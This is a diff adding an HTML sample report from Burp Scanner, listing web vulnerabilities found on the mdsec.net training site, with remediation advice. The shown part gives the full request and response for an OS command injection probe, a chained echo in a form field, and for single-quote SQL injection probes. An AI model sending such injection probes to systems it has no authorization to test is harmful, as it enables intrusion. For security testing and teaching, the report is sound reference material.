@@ -1,0 +1,1445 @@
+
+
+<html><head><title>Burp Scanner Sample Report</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { width: 930px; padding: 0 15px; margin: 20px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.rule { height: 0px; border-top: 1px solid #404042; padding: 0; margin: 20px -15px 0 -15px; }
+.title { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.title img { float: right; display: inline; padding: 0; margin: -3px -5px; }
+.heading { background: #404042; margin: 0 -15px 10px -15px; padding: 0; display: inline-block; overflow: hidden; }
+.heading img { float: right; display: inline; margin: 8px 10px 0 10px; padding: 0; }
+table.overview_table { border: 1px solid #c0c0c0; margin: 0; padding: 5px; }
+table.overview_table td.info { padding: 5px; background: #dedede; text-align: right; border-top: 2px solid #ffffff; border-right: 2px solid #ffffff; }
+table.overview_table td.info_end { padding: 5px; background: #dedede; text-align: right; border-top: 2px solid #ffffff; }
+table.overview_table td.colour_holder { padding: 0px; border-top: 2px solid #ffffff; border-right: 2px solid #ffffff; }
+table.overview_table td.colour_holder_end { padding: 0px; border-top: 2px solid #ffffff; }
+table.overview_table td.label { padding: 5px; font-weight: bold; }
+table.summary_table td { padding: 5px; background: #dedede; text-align: left; border-top: 2px solid #ffffff; border-right: 2px solid #ffffff; }
+table.summary_table td.icon { background: #404042; }
+.colour_block { padding: 5px; text-align: right; display: block; font-weight: bold; }
+.high_certain { border: 2px solid #f00; background: #f00; }
+.high_firm { border: 2px solid #f66; background: #f66; }
+.high_tentative { border: 2px solid #fcc; background: #fcc; }
+.medium_certain { border: 2px solid #f90; background: #f90; }
+.medium_firm { border: 2px solid #ffc266; background: #ffc266; }
+.medium_tentative { border: 2px solid #ffebcc; background: #ffebcc; }
+.low_certain { border: 2px solid #fe0; background: #fe0; }
+.low_firm { border: 2px solid #fff566; background: #fff566; }
+.low_tentative { border: 2px solid #fffccc; background: #fffccc; }
+.info_certain { border: 2px solid #ababab; background: #ababab; }
+.info_firm { border: 2px solid #cdcdcd; background: #cdcdcd; }
+.info_tentative { border: 2px solid #eee; background: #eee; }
+.row_total { border: 1px solid #dedede; background: #fff; }
+.grad_mark { padding: 4px; border-left: 1px solid #404042; display: inline-block; }
+.bar { margin-top: 3px; }
+.TOCH0 { font-size: 1.0em; font-weight: bold; word-wrap: break-word; }
+.TOCH1 { font-size: 0.8em; text-indent: -20px; padding-left: 50px; margin: 0; word-wrap: break-word; }
+.TOCH2 { font-size: 0.8em; text-indent: -20px; padding-left: 70px; margin: 0; word-wrap: break-word; }
+.BODH0 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; padding: 10px 15px; margin: 0 -15px 10px -15px; display: inline-block; color: #ffffff; background-color: #e06228; width: 100%; word-wrap: break-word; }
+.BODH1 { font-size: 1.3em; line-height: 1.2em; font-weight: normal; padding: 13px 15px; margin: 0 -15px 0 -15px; display: inline-block; width: 100%; word-wrap: break-word; }
+.BODH2 { font-size: 1.0em; font-weight: bold; line-height: 2.0em; width: 100%; word-wrap: break-word; }
+.PREVNEXT { font-size: 0.7em; font-weight: bold; color: #ffffff; padding: 2px 5px; }
+.PREVNEXT:link, .PREVNEXT:visited { color: #e06228 !important; background: #ffffff !important; border: 1px solid #e06228 !important; text-decoration: none; }
+.PREVNEXT:hover, .PREVNEXT:active { color: #404042 !important; background: #e06228 !important; border: 1px solid #e06228 !important; text-decoration: none; }
+.TEXT { font-size: 0.8em; padding: 0; margin: 0; display: inline-block;  }
+TD { font-size: 0.8em; }
+.HIGHLIGHT { background-color: yellow; }
+.rr_div { background-color: #dedede; border: 2px solid #404042; width: 916px; word-wrap: break-word; -ms-word-wrap: break-word; margin: 0.8em 0; padding: 5px; font-size: 0.8em; max-height: 300px; overflow-y: auto; }
+
+@media print {
+    body { width: 100%; color: #000000; position: relative; }
+    #container { width: 98%; padding: 0; margin: 0; }
+    h1 { color: #000000; }
+    h2 { color: #000000;}
+    .rule { margin: 20px 0 0 0; }
+    .title { color: #000000; margin: 0 0 10px 0; padding: 10px 0; }
+    .title h1 { color: #000000; }
+    .title img { margin: -3px 0; }
+    .heading { margin: 0 0 10px 0; }
+    .BODH0 { color: #000000; }
+    .BODH1 { color: #000000; }
+    .PREVNEXT { visibility: hidden; display: none; }
+    .rr_div { width: 98%; margin: 0.8em auto; max-height: none !important; overflow: hidden; }
+}
+
+</style>
+<!--[if lt IE 8 ]> <style type="text/css"> 
+    body { text-align: center; }
+    #container { text-align: left; }
+    .rr_div { width: 896px; }
+</style> <![endif]-->
+<!--[if IE 8 ]> <style type="text/css"> 
+    .colour_block { padding: 10px 5px; }
+</style> <![endif]-->
+<!--[if gt IE 8 ]> <style type="text/css"> 
+    .colour_block { padding: 12px 5px; }
+</style> <![endif]-->
+</head>
+<body>
+<div id="container">
+<div class="title"><img src="images/burp-suite.gif" width="166" height="46"><h1>Burp Scanner Sample Report</h1></div>
+<h1>Summary</h1>
+<span class="TEXT">The table below shows the numbers of issues identified in different categories. Issues are classified according to severity as High, Medium, Low or Information. This reflects the likely impact of each issue for a typical organization. Issues are also classified according to confidence as Certain, Firm or Tentative. This reflects the inherent reliability of the technique that was used to identify the issue.</span><br><br><table cellpadding="0" cellspacing="0" class="overview_table">
+    <tr>
+        <td width="70">&nbsp;</td>
+        <td width="90">&nbsp;</td>
+        <td colspan="4" height="40" align="center" class="label">Confidence</td>
+    </tr>
+    <tr>
+        <td width="70">&nbsp;</td>
+        <td width="90">&nbsp;</td>
+        <td width="82" height="30" class="info">Certain</td>
+        <td width="82" height="30" class="info">Firm</td>
+        <td width="82" height="30" class="info">Tentative</td>
+        <td width="82" height="30" class="info_end">Total</td>
+    </tr>
+    <tr>
+        <td rowspan="4" valign="middle" class="label">Severity</td>
+        <td class="info" height="30">High</td>
+        <td class="colour_holder"><span class="colour_block high_certain">12</span></td>
+        <td class="colour_holder"><span class="colour_block high_firm">4</span></td>
+        <td class="colour_holder"><span class="colour_block high_tentative">1</span></td>
+        <td class="colour_holder_end"><span class="colour_block row_total">17</span></td>
+    </tr>
+    <tr>
+        <td class="info" height="30">Medium</td>
+        <td class="colour_holder"><span class="colour_block medium_certain">0</span></td>
+        <td class="colour_holder"><span class="colour_block medium_firm">2</span></td>
+        <td class="colour_holder"><span class="colour_block medium_tentative">0</span></td>
+        <td class="colour_holder_end"><span class="colour_block row_total">2</span></td>
+    </tr>
+    <tr>
+        <td class="info" height="30">Low</td>
+        <td class="colour_holder"><span class="colour_block low_certain">4</span></td>
+        <td class="colour_holder"><span class="colour_block low_firm">0</span></td>
+        <td class="colour_holder"><span class="colour_block low_tentative">0</span></td>
+        <td class="colour_holder_end"><span class="colour_block row_total">4</span></td>
+    </tr>
+    <tr>
+        <td class="info" height="30">Information</td>
+        <td class="colour_holder"><span class="colour_block info_certain">9</span></td>
+        <td class="colour_holder"><span class="colour_block info_firm">2</span></td>
+        <td class="colour_holder"><span class="colour_block info_tentative">0</span></td>
+        <td class="colour_holder_end"><span class="colour_block row_total">11</span></td>
+    </tr>
+</table><br>
+<span class="TEXT">The chart below shows the aggregated numbers of issues identified in each category. Solid colored bars represent issues with a confidence level of Certain, and the bars fade as the confidence level falls.</span><br><br><table cellpadding="0" cellspacing="0" class="overview_table">
+    <tr>
+        <td width="70">&nbsp;</td>
+        <td width="90">&nbsp;</td>
+        <td colspan="10" height="40" align="center" class="label">Number of issues</td>
+    </tr>
+    <tr>
+        <td width="70">&nbsp;</td>
+        <td width="90">&nbsp;</td>
+        <td width="75"><span class="grad_mark">0</span></td>
+        <td width="75"><span class="grad_mark">2</span></td>
+        <td width="75"><span class="grad_mark">4</span></td>
+        <td width="75"><span class="grad_mark">6</span></td>
+        <td width="75"><span class="grad_mark">8</span></td>
+        <td width="75"><span class="grad_mark">10</span></td>
+        <td width="75"><span class="grad_mark">12</span></td>
+        <td width="75"><span class="grad_mark">14</span></td>
+        <td width="75"><span class="grad_mark">16</span></td>
+    </tr>
+    <tr>
+        <td rowspan="4" valign="middle" class="label">Severity</td>
+        <td class="info">High</td>
+        <td colspan="9" height="30">
+            <table cellpadding="0" cellspacing="0"><tr><td><img class="bar" src="images/bar-high-certain.gif" width="450" height="16"></td><td><img class="bar" src="images/bar-high-firm.gif" width="150" height="16"></td><td><img class="bar" src="images/bar-high-tentative.gif" width="38" height="16"></td></tr></table>
+        </td>
+        <td>&nbsp;</td>
+    </tr>
+    <tr>
+        <td class="info">Medium</td>
+        <td colspan="9" height="30">
+            <table cellpadding="0" cellspacing="0"><tr><td><img class="bar" src="images/bar-medium-certain.gif" width="0" height="16"></td><td><img class="bar" src="images/bar-medium-firm.gif" width="75" height="16"></td><td><img class="bar" src="images/bar-medium-tentative.gif" width="0" height="16"></td></tr></table>
+        </td>
+        <td>&nbsp;</td>
+    </tr>
+    <tr>
+        <td class="info">Low</td>
+        <td colspan="9" height="30">
+            <table cellpadding="0" cellspacing="0"><tr><td><img class="bar" src="images/bar-low-certain.gif" width="150" height="16"></td><td><img class="bar" src="images/bar-low-firm.gif" width="0" height="16"></td><td><img class="bar" src="images/bar-low-tentative.gif" width="0" height="16"></td></tr></table>
+        </td>
+        <td>&nbsp;</td>
+    </tr>
+    <tr>
+        <td class="info">Information</td>
+        <td colspan="9" height="30">
+            <table cellpadding="0" cellspacing="0"><tr><td><img class="bar" src="images/bar-info-certain.gif" width="338" height="16"></td><td><img class="bar" src="images/bar-info-firm.gif" width="75" height="16"></td><td><img class="bar" src="images/bar-info-tentative.gif" width="0" height="16"></td></tr></table>
+        </td>
+        <td>&nbsp;</td>
+    </tr>
+</table>
+
+<div class="rule"></div>
+<h1>Contents</h1>
+<p class="TOCH0"><a href="#1">1.&nbsp;OS command injection</a></p>
+<p class="TOCH0"><a href="#2">2.&nbsp;SQL injection</a></p>
+<p class="TOCH1"><a href="#2.1">2.1.&nbsp;http://mdsec.net/addressbook/32/Default.aspx [Address parameter]</a></p>
+<p class="TOCH1"><a href="#2.2">2.2.&nbsp;http://mdsec.net/addressbook/32/Default.aspx [Email parameter]</a></p>
+<p class="TOCH1"><a href="#2.3">2.3.&nbsp;https://mdsec.net/auth/319/Default.ashx [password parameter]</a></p>
+<p class="TOCH1"><a href="#2.4">2.4.&nbsp;https://mdsec.net/auth/319/Default.ashx [username parameter]</a></p>
+<p class="TOCH0"><a href="#3">3.&nbsp;File path traversal</a></p>
+<p class="TOCH0"><a href="#4">4.&nbsp;XML external entity injection</a></p>
+<p class="TOCH0"><a href="#5">5.&nbsp;LDAP injection</a></p>
+<p class="TOCH0"><a href="#6">6.&nbsp;XPath injection</a></p>
+<p class="TOCH0"><a href="#7">7.&nbsp;Cross-site scripting (stored)</a></p>
+<p class="TOCH0"><a href="#8">8.&nbsp;HTTP header injection</a></p>
+<p class="TOCH0"><a href="#9">9.&nbsp;Cross-site scripting (reflected)</a></p>
+<p class="TOCH1"><a href="#9.1">9.1.&nbsp;http://mdsec.net/search/11/Default.aspx [SearchTerm parameter]</a></p>
+<p class="TOCH1"><a href="#9.2">9.2.&nbsp;http://mdsec.net/search/21/Default.aspx [SearchTerm parameter]</a></p>
+<p class="TOCH1"><a href="#9.3">9.3.&nbsp;http://mdsec.net/search/36/Default.aspx [SearchTerm parameter]</a></p>
+<p class="TOCH1"><a href="#9.4">9.4.&nbsp;http://mdsec.net/search/46/Default.aspx [SearchTerm parameter]</a></p>
+<p class="TOCH1"><a href="#9.5">9.5.&nbsp;http://mdsec.net/search/48/Default.aspx [SearchTerm parameter]</a></p>
+<p class="TOCH0"><a href="#10">10.&nbsp;Cleartext submission of password</a></p>
+<p class="TOCH0"><a href="#11">11.&nbsp;SSL cookie without secure flag set</a></p>
+<p class="TOCH0"><a href="#12">12.&nbsp;Session token in URL</a></p>
+<p class="TOCH0"><a href="#13">13.&nbsp;Open redirection</a></p>
+<p class="TOCH1"><a href="#13.1">13.1.&nbsp;http://mdsec.net/updates/18/ [redir parameter]</a></p>
+<p class="TOCH1"><a href="#13.2">13.2.&nbsp;http://mdsec.net/updates/23/ [redir parameter]</a></p>
+<p class="TOCH1"><a href="#13.3">13.3.&nbsp;http://mdsec.net/updates/8/ [redir parameter]</a></p>
+<p class="TOCH0"><a href="#14">14.&nbsp;Password field with autocomplete enabled</a></p>
+<p class="TOCH0"><a href="#15">15.&nbsp;Cookie without HttpOnly flag set</a></p>
+<p class="TOCH0"><a href="#16">16.&nbsp;File upload functionality</a></p>
+<p class="TOCH1"><a href="#16.1">16.1.&nbsp;http://mdsec.net/filestore/327/</a></p>
+<p class="TOCH1"><a href="#16.2">16.2.&nbsp;http://mdsec.net/filestore/8/</a></p>
+<p class="TOCH0"><a href="#17">17.&nbsp;Frameable response (potential Clickjacking)</a></p>
+<p class="TOCH1"><a href="#17.1">17.1.&nbsp;http://mdsec.net/auth/369/Home.ashx</a></p>
+<p class="TOCH1"><a href="#17.2">17.2.&nbsp;https://mdsec.net/auth/372/Home.ashx</a></p>
+<p class="TOCH0"><a href="#18">18.&nbsp;TRACE method is enabled</a></p>
+<p class="TOCH1"><a href="#18.1">18.1.&nbsp;http://mdsec.net/</a></p>
+<p class="TOCH1"><a href="#18.2">18.2.&nbsp;https://mdsec.net/</a></p>
+<p class="TOCH0"><a href="#19">19.&nbsp;Email addresses disclosed</a></p>
+<p class="TOCH0"><a href="#20">20.&nbsp;Credit card numbers disclosed</a></p>
+<p class="TOCH0"><a href="#21">21.&nbsp;HTML does not specify charset</a></p>
+<p class="TOCH0"><a href="#22">22.&nbsp;Content type is not specified</a></p>
+<br><div class="rule"></div>
+<span class="BODH0" id="1">1.&nbsp;OS command injection</span>
+<br><a class="PREVNEXT" href="#2">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_high_firm_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>High</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Firm</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/admin/5/Default.aspx</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The <b>DirName</b> parameter appears to be vulnerable to OS command injection attacks. It is possible to use  the ampersand character (&)  to inject arbitrary OS commands and retrieve the output in the application's responses.<br><br>The payload <b>%26echo%20e247e96e68<wbr>b853d5%20148c61a9104a4cbf<wbr>%26</b> was submitted in the DirName parameter. The application's response appears to contain the output from the injected command, indicating that the command was executed.</span>
+<h2>Issue background</h2>
+<span class="TEXT">Operating system command injection vulnerabilities arise when an application incorporates user-controllable data into a command that is processed by a shell command interpreter. If the user data is not strictly validated, an attacker can use shell metacharacters to modify the command to be executed, and inject arbitrary further commands that will be executed by the server.<br><br>OS command injection vulnerabilities are usually very serious and may lead to compromise of the server hosting the application, or of the application's own data and functionality. The exact potential for exploitation may depend upon the security context in which the command is executed, and the privileges which this context has regarding sensitive resources on the server.</span>
+<h2>Issue remediation</h2>
+<span class="TEXT">If possible, applications should avoid incorporating user-controllable data into operating system commands. In almost every situation, there are safer alternative methods of performing server-level tasks, which cannot be manipulated to perform additional commands than the one intended.<br><br>If it is considered unavoidable to incorporate user-supplied data into operating system commands, the following two layers of defense should be used to prevent attacks:<ul><li>The user data should be strictly validated. Ideally, a whitelist of specific accepted values should be used. Otherwise, only short alphanumeric strings should be accepted. Input containing any other data, including any conceivable shell metacharacter or whitespace, should be rejected.</li><li>The application should use command APIs that launch a specific process via its name and command-line parameters, rather than passing a command string to a shell interpreter that supports command chaining and redirection. For example, the Java API Runtime.exec and the ASP.NET API Process.Start do not support shell metacharacters. This defense can mitigate the impact of an attack even in the event that an attacker circumvents the input validation defenses.</li></ul></span>
+<h2>Request</h2>
+<div class="rr_div"><span>POST /admin/5/Default.aspx HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net/admin/5/<br>Connection: keep-alive<br>Content-Type: application/x-www-form<wbr>-urlencoded<br>Content-Length: 12778<br><br>__VIEWSTATE=%2FwEPDw<wbr>UJOTAwNjg0Njc4D2QWAm<wbr>YPZBYCAgcPFgIeCWlubm<wbr>VyaHRtbAXnSCBWb2x1bW<wbr>UgaW4gZHJpdmUgQyBpcy<wbr>BXaW5kb3dzPGJyPiBWb2<wbr>x1bWUgU2VyaWFsIE51bW<wbr>JlciBpcyA5NEFCLUEzMTI8YnI<wbr>%2BPGJyPiBEaXJlY3Rvc<wbr>nkgb2YgQzpcZmls<br><b>...[SNIP]...</b><br>ICAgICAgICAgICAgMTI0<wbr>IERpcihzKSAgIDYsMTA3<wbr>LDM0NCw4OTYgYnl0ZXMg<wbr>ZnJlZTxicj5kZOaJR1lB<wbr>52PYVS2H%2FGB8jzdrhp3k&amp;_<wbr>_EVENTVALIDATION=<wbr>%2FwEWBALNyNGZCwLeg<wbr>%2FGZAQKdwuSaAQLUwvG<wbr>2BZxo5h%2F4ter0UR0q7<wbr>i1T47yJ6rjE&amp;DirName=<span class="HIGHLIGHT">%26echo%20e247e96e68<wbr>b853d5%20148c61a9104a4cbf<wbr>%26</span>&amp;ListDir=Show+contents</span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:41:52 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 23303<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Directory Manage<br><b>...[SNIP]...</b><br>&lt;br&gt;<span class="HIGHLIGHT">e247e96e68b853d5 148c61a9104a4cbf</span>&lt;br&gt;<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH0" id="2">2.&nbsp;SQL injection</span>
+<br><a class="PREVNEXT" href="#1">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#3">Next</a>
+<br>
+<br><span class="TEXT">There are 4 instances of this issue:
+<ul>
+<li><a href="#2.1">http://mdsec.net/addressbook/32/Default<wbr>.aspx [Address parameter]</a></li>
+<li><a href="#2.2">http://mdsec.net/addressbook/32/Default<wbr>.aspx [Email parameter]</a></li>
+<li><a href="#2.3">https://mdsec.net/auth/319/Default.ashx [password parameter]</a></li>
+<li><a href="#2.4">https://mdsec.net/auth/319/Default.ashx [username parameter]</a></li>
+</ul></span>
+<h2>Issue background</h2>
+<span class="TEXT">SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.<br><br>Various attacks can be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and executing operating system commands.</span>
+<h2>Remediation background</h2>
+<span class="TEXT">The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.<br><br>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:<ul><li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string in which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li><li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li></ul></span>
+<br><br><div class="rule"></div>
+<span class="BODH1" id="2.1">2.1.&nbsp;http://mdsec.net/addressbook/32/Default.aspx [Address parameter]</span>
+<br><a class="PREVNEXT" href="#2.2">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_high_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>High</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/addressbook/32/Default<wbr>.aspx</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The <b>Address</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the Address parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br>The database appears to be Microsoft SQL Server.</span>
+<h2>Remediation detail</h2>
+<span class="TEXT">The application should handle errors gracefully and prevent SQL error messages from being returned in responses. </span>
+<h2>Request 1</h2>
+<div class="rr_div"><span>POST /addressbook/32/Default<wbr>.aspx HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net<wbr>/addressbook/32/<br>Connection: keep-alive<br>Content-Type: application/x-www-form<wbr>-urlencoded<br>Content-Length: 116<br><br>__VIEWSTATE=%2FwEPDw<wbr>UKMTI0NzE5MjI0MGRkoX<wbr>v4BXfugQRsGddxJO96PBvk5rI<wbr>%3D&amp;Name=&amp;Email=&amp;Phone=<wbr>&amp;Search=Search&amp;Address=<span class="HIGHLIGHT">'</span>&amp;Age=</span></div>
+<h2>Response 1</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:40:58 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 2642<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Contacts&lt;/title&gt;<br><b>...[SNIP]...</b><br>&lt;b&gt;Error: <span class="HIGHLIGHT">Unclosed quotation mark</span> after the character string ''.<br><span class="HIGHLIGHT">Incorrect syntax near</span> ''.&lt;/b&gt;<br><b>...[SNIP]...</b><br></span></div>
+<h2>Request 2</h2>
+<div class="rr_div"><span>POST /addressbook/32/Default<wbr>.aspx HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net<wbr>/addressbook/32/<br>Connection: keep-alive<br>Content-Type: application/x-www-form<wbr>-urlencoded<br>Content-Length: 116<br><br>__VIEWSTATE=%2FwEPDw<wbr>UKMTI0NzE5MjI0MGRkoX<wbr>v4BXfugQRsGddxJO96PBvk5rI<wbr>%3D&amp;Name=&amp;Email=&amp;Phone=<wbr>&amp;Search=Search&amp;Address=<span class="HIGHLIGHT">''</span>&amp;Age=</span></div>
+<h2>Response 2</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:40:58 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 2721<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Contacts&lt;/title&gt;<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH1" id="2.2">2.2.&nbsp;http://mdsec.net/addressbook/32/Default.aspx [Email parameter]</span>
+<br><a class="PREVNEXT" href="#2.1">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#2.3">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_high_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>High</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/addressbook/32/Default<wbr>.aspx</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The <b>Email</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the Email parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br>The database appears to be Microsoft SQL Server.</span>
+<h2>Remediation detail</h2>
+<span class="TEXT">The application should handle errors gracefully and prevent SQL error messages from being returned in responses. </span>
+<h2>Request 1</h2>
+<div class="rr_div"><span>POST /addressbook/32/Default<wbr>.aspx HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net<wbr>/addressbook/32/<br>Connection: keep-alive<br>Content-Type: application/x-www-form<wbr>-urlencoded<br>Content-Length: 116<br><br>__VIEWSTATE=%2FwEPDw<wbr>UKMTI0NzE5MjI0MGRkoX<wbr>v4BXfugQRsGddxJO96PBvk5rI<wbr>%3D&amp;Name=&amp;Email=<span class="HIGHLIGHT">'</span>&amp;Phone=&amp;Search=Search<wbr>&amp;Address=&amp;Age=</span></div>
+<h2>Response 1</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:40:57 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 2667<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Contacts&lt;/title&gt;<br><b>...[SNIP]...</b><br>&lt;b&gt;Error: <span class="HIGHLIGHT">Incorrect syntax near</span> ' AND contactaddress LIKE '.<br><span class="HIGHLIGHT">Unclosed quotation mark</span> after the character string ''.&lt;/b&gt;<br><b>...[SNIP]...</b><br></span></div>
+<h2>Request 2</h2>
